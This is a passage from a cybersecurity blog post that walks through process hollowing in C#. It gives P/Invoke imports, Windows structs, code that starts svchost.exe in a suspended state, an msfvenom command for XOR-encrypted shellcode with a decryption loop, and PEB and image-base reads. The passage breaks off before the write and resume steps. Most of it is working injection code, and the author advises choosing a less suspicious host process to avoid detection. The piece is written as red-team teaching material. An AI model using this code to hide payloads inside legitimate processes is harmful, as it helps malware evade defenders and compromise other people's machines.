<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Shellcode Injection in C# - Part 2 - Process Hollowing" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="Discussing shellcode injection techniques we can use while utilizing C#" /><meta property="og:description" content="Discussing shellcode injection techniques we can use while utilizing C#" /><link rel="canonical" href="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-2/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-2/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-09T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Shellcode Injection in C# - Part 2 - Process Hollowing" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2022-09-09T00:00:00+05:00","datePublished":"2022-09-09T00:00:00+05:00","description":"Discussing shellcode injection techniques we can use while utilizing C#","headline":"Shellcode Injection in C# - Part 2 - Process Hollowing","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-2/"},"url":"https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-2/"}</script><title>Shellcode Injection in C# - Part 2 - Process Hollowing | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Shellcode Injection in C# - Part 2 - Process Hollowing</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1662663600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 9, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1658 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This post is part 2 of shellcode injection techniques. You can read part 1 <a href="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques/">here</a>. In this one, we will look into Process Hollowing in C#.</p><h2 id="process-hollowing"><span class="mr-2">Process Hollowing</span><a href="#process-hollowing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Process Hollowing is a technique in which we use a legitimate process, inject it with our shellcode and make the process run our shellcode. According to <a href="https://attack.mitre.org/techniques/T1055/012/">Mitre</a> <em>Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code class="language-plaintext highlighter-rouge">CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code class="language-plaintext highlighter-rouge">ZwUnmapViewOfSection</code> or <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code> before being written to, realigned to the injected code, and resumed via <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>, <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>, <code class="language-plaintext highlighter-rouge">SetThreadContext</code>, then <code class="language-plaintext highlighter-rouge">ResumeThread</code> respectively.</em> <br /> Nice. We know what imports we have to make. The flow chart of API calls will go like this <br /> <img data-src="/assets/img/shellcode-injections-2/api-calls.png" alt="Process Hollowing API Calls" data-proofer-ignore> <br /> So we will be first creating a process in a suspended state using <code class="language-plaintext highlighter-rouge">CreateProcess</code>, query the process using <code class="language-plaintext highlighter-rouge">ZwQueryInformationProcess</code>, get some values using <code class="language-plaintext highlighter-rouge">ReadProcessMemory</code>, write our shellcode using <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> and then resume the thread using <code class="language-plaintext highlighter-rouge">ResumeThread</code>.</p><h3 id="imports"><span class="mr-2">Imports</span><a href="#imports" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can start writing the code with these API imports. Using the Windows Docs and the calls we need, we get the imports as</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nSize</span><span class="p">,</span> <span class="k">ref</span> <span class="n">IntPtr</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">ReadProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="p">[</span><span class="n">Out</span><span class="p">]</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="k">out</span> <span class="n">IntPtr</span> <span class="n">lpNumberOfBytesRead</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">CreateProcess</span><span class="p">(</span><span class="kt">string</span> <span class="n">lpApplicationName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCommandLine</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpProcessAttributes</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandles</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpEnvironment</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCurrentDirectory</span><span class="p">,</span> <span class="k">ref</span> <span class="n">STARTUPINFO</span> <span class="n">lpStartupInfo</span><span class="p">,</span> <span class="k">ref</span> <span class="n">PROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">int</span> <span class="nf">ZwQueryInformationProcess</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="kt">int</span> <span class="n">procInformationClass</span><span class="p">,</span> <span class="k">ref</span> <span class="n">PROCESS_BASIC_INFORMATION</span> <span class="n">procInformation</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">ProcInfoLen</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">uint</span> <span class="n">retlen</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">uint</span> <span class="nf">ResumeThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hThread</span><span class="p">);</span>
</pre></table></code></div></div><p>Pretty self explanatory. Look at my previous posts if this confuses you. <br /> We also need some structs and enums for this to work. These are <code class="language-plaintext highlighter-rouge">STARTUPINFO</code>, <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> and <code class="language-plaintext highlighter-rouge">PROCESS_BASIC_INFORMATION</code>. These stucts, in the C# format can be found at <a href="https://www.pinvoke.net/index.aspx">Pinvoke</a> website. We also have the <code class="language-plaintext highlighter-rouge">SUSPENDED</code> state which we will provide as a creation flag to <code class="language-plaintext highlighter-rouge">CreateProcess</code> to create a process in a suspended state. All combined these become</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
<span class="k">internal</span> <span class="k">struct</span> <span class="nc">PROCESS_BASIC_INFORMATION</span>
<span class="p">{</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">ExitStatus</span><span class="p">;</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">PebAddress</span><span class="p">;</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">AffinityMask</span><span class="p">;</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">BasePriority</span><span class="p">;</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">UniquePID</span><span class="p">;</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">InheritedFromUniqueProcessId</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Unicode</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">struct</span> <span class="nc">STARTUPINFO</span>
<span class="p">{</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">cb</span><span class="p">;</span>
 <span class="k">public</span> <span class="kt">string</span> <span class="n">lpReserved</span><span class="p">;</span>
 <span class="k">public</span> <span class="kt">string</span> <span class="n">lpDesktop</span><span class="p">;</span>
 <span class="k">public</span> <span class="kt">string</span> <span class="n">lpTitle</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwX</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwY</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwXSize</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwYSize</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwXCountChars</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwYCountChars</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwFillAttribute</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwFlags</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int16</span> <span class="n">wShowWindow</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">Int16</span> <span class="n">cbReserved2</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpReserved2</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdInput</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdOutput</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdError</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">struct</span> <span class="nc">PROCESS_INFORMATION</span>
<span class="p">{</span>
 <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">;</span>
 <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hThread</span><span class="p">;</span>
 <span class="k">public</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">;</span>
 <span class="k">public</span> <span class="kt">int</span> <span class="n">dwThreadId</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">CreationFlags</span>
<span class="p">{</span>
 <span class="k">public</span> <span class="k">const</span> <span class="kt">uint</span> <span class="n">SUSPENDED</span> <span class="p">=</span> <span class="m">0x4</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">public</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">PROCESSBASICINFORMATION</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</pre></table></code></div></div><p>These can be found here</p><ul><li><a href="https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html">PROCESS_BASIC_INFORMATION</a><li><a href="https://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html">STARTUPINFO</a><li><a href="https://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html">PROCESS_INFORMATION</a></ul><h3 id="main-method"><span class="mr-2">Main Method</span><a href="#main-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we have the imports and structs set we can get into it. <br /> First we will create our process in a suspended state. The process can be anything for a POC but use something that would be less sus to avoid detections. We also need to initialize some objects that we are going to use late.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">PROCESS_INFORMATION</span> <span class="n">proc_info</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">PROCESS_INFORMATION</span><span class="p">();</span>
<span class="n">STARTUPINFO</span> <span class="n">startup_info</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">STARTUPINFO</span><span class="p">();</span>
<span class="n">PROCESS_BASIC_INFORMATION</span> <span class="n">pbi</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">PROCESS_BASIC_INFORMATION</span><span class="p">();</span>

<span class="kt">string</span> <span class="n">path</span> <span class="p">=</span> <span class="s">@"C:\\Windows\\System32\\svchost.exe"</span><span class="p">;</span>
<span class="kt">bool</span> <span class="n">procINIT</span> <span class="p">=</span> <span class="nf">CreateProcess</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">CreationFlags</span><span class="p">.</span><span class="n">SUSPENDED</span><span class="p">,</span>
                <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">ref</span> <span class="n">startup_info</span><span class="p">,</span> <span class="k">ref</span> <span class="n">proc_info</span><span class="p">);</span>
</pre></table></code></div></div><p>To make sure the process created sucessfully we can use a simple if statement and use <code class="language-plaintext highlighter-rouge">procINIT</code></p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">procINIT</span> <span class="p">==</span> <span class="k">true</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Process create successfully."</span><span class="p">);</span>
  <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Process ID: {0}"</span><span class="p">,</span> <span class="n">proc_info</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
  <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[-] Could not create the process."</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The process ID is fetched from the <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> struct that we initialized. <br /> Paste the shellcode obtained from <code class="language-plaintext highlighter-rouge">msfvenom</code> now. Ill be using the calc popping shellcode again but this time I’ll also be XOR encrypting it using <code class="language-plaintext highlighter-rouge">msfvenom</code>. The command becomes</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">CMD</span><span class="o">=</span>calc.exe <span class="nt">-f</span> csharp <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">--encrypt</span> xor <span class="nt">--encrypt-key</span> z
</pre></table></code></div></div><p>And the decrypting shellcode part is</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
<span class="p">{</span>
  <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="sc">'z'</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Then we need to get the PEB or Process Environment Block of the process in suspended state. THe PEB is a memory structure that every process has and it comtains some interesting fields that we can use to calculate things like <code class="language-plaintext highlighter-rouge">ImageBaseAddress</code>, which is what we are going to do. But first we need to query the process to get the PEB Address and then add <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm"><code class="language-plaintext highlighter-rouge">0x10</code></a> offset to it to get the pointer to the base image address. We can get the <code class="language-plaintext highlighter-rouge">PebAddress</code> from the <code class="language-plaintext highlighter-rouge">PROCESS_BASIC_INFORMATION</code> struct that we have. <br /> For the API <code class="language-plaintext highlighter-rouge">ZwQueryInformationProcess</code> we will need a process handle, which we can retrieve from <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code>. The second parameter is <code class="language-plaintext highlighter-rouge">procInformationClass</code> which from the Microsoft Docs, we can set to 0 to get a pointer to the PEB structure. Then we can calculate the pointer to image base address with adding PEB Address and an offset of <code class="language-plaintext highlighter-rouge">0x10</code>.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kt">uint</span> <span class="n">retLength</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
<span class="n">IntPtr</span> <span class="n">procHandle</span> <span class="p">=</span> <span class="n">proc_info</span><span class="p">.</span><span class="n">hProcess</span><span class="p">;</span>
<span class="nf">ZwQueryInformationProcess</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">pbi</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span> <span class="p">*</span> <span class="m">6</span><span class="p">),</span> <span class="k">ref</span> <span class="n">retLength</span><span class="p">);</span>
<span class="n">IntPtr</span> <span class="n">imageBaseAddr</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)((</span><span class="n">Int64</span><span class="p">)</span><span class="n">pbi</span><span class="p">.</span><span class="n">PebAddress</span> <span class="p">+</span> <span class="m">0x10</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Image Base Address found: 0x{0}"</span><span class="p">,</span> <span class="n">imageBaseAddr</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"x"</span><span class="p">));</span>
</pre></table></code></div></div><p>Now we need to write the actual shellcode into the entery point address for it to execute. We cant directly write to it because the address changes due to ASLR (Address Space Layout Randomization). So we need to calculate it for each process. That can be done by</p><ul><li>Calculating actual image base adress<li>Calculating <code class="language-plaintext highlighter-rouge">e_lfanew</code> value<li>Calculating Entrypoint Relative Virtual Address (RVA)<li>Calculating EntryPoint RVA<li>Calculating actual abslute entrypoint address <br /> I know thats a lot. We will be using <code class="language-plaintext highlighter-rouge">ReadProcessMemory</code> to read the memory for these addresses and calculate them. First we will calculate the actual image base for executable address. We will be setting the base address bytes to <code class="language-plaintext highlighter-rouge">0x8</code> for x64 process. Then read the memory to those base address bytes of PEB to get the address we need. The 0 in <code class="language-plaintext highlighter-rouge">BitConverter</code> indicates the starting point. We are reading 8 bytes in as <code class="language-plaintext highlighter-rouge">ToInt64</code>.<div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">byte</span><span class="p">[]</span> <span class="n">baseAddrBytes</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">0x8</span><span class="p">];</span>
<span class="n">IntPtr</span> <span class="n">lpNumberofBytesRead</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
<span class="nf">ReadProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">imageBaseAddr</span><span class="p">,</span> <span class="n">baseAddrBytes</span><span class="p">,</span> <span class="n">baseAddrBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpNumberofBytesRead</span><span class="p">);</span>
<span class="n">IntPtr</span> <span class="n">execAddr</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)(</span><span class="n">BitConverter</span><span class="p">.</span><span class="nf">ToInt64</span><span class="p">(</span><span class="n">baseAddrBytes</span><span class="p">,</span> <span class="m">0</span><span class="p">));</span>
</pre></table></code></div></div><p>After getting that, we will be reading the memory but this time to <code class="language-plaintext highlighter-rouge">0x200</code> bytes from the base address we just got to parse the PE structure.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kt">byte</span><span class="p">[]</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">0x200</span><span class="p">];</span>
<span class="nf">ReadProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">execAddr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpNumberofBytesRead</span><span class="p">);</span>
